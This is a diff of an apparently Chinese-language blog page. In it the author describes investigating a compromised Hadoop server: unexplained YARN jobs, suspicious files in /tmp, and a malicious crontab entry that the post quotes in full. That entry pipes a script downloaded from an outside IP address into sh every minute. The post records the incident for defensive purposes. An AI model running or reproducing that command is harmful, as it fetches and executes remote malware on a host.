@@ -145,15 +145,15 @@
 
     <p>今天检查Hadoop 服务器发现Yarn上面的job莫名其妙的变多了，而且一直再跑。
 <img src="http://112firshme11224.test.upcdn.net/demos/7422da30-8014-41f6-a922-55f86a3ce252.png" alt="" />
-经过排查在<code class="highlighter-rouge">/tmp/ /var/tmp</code> 下面发现了 Java 还有tmp.txt
+经过排查在<code class="language-plaintext highlighter-rouge">/tmp/ /var/tmp</code> 下面发现了 Java 还有tmp.txt
 内容如下：
 <img src="http://112firshme11224.test.upcdn.net/demos/63c45ec8-bcbd-4fbd-98bb-ee624eb4ea70.png" alt="" /></p>
 
-    <p>服务器地址:<code class="highlighter-rouge">transfer.sh</code></p>
+    <p>服务器地址:<code class="language-plaintext highlighter-rouge">transfer.sh</code></p>
   </li>
   <li>
     <ol>
-      <li>检查 <code class="highlighter-rouge">crontab -l </code> 发现了一个莫名其妙的 job
+      <li>检查 <code class="language-plaintext highlighter-rouge">crontab -l </code> 发现了一个莫名其妙的 job
         <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span> <span class="k">*</span> <span class="k">*</span> <span class="k">*</span> <span class="k">*</span> wget <span class="nt">-q</span> <span class="nt">-O</span> - http://185.222.210.59/cr.sh | sh <span class="o">&gt;</span> /dev/null 2&gt;&amp;1
 </code></pre></div>        </div>
       </li>
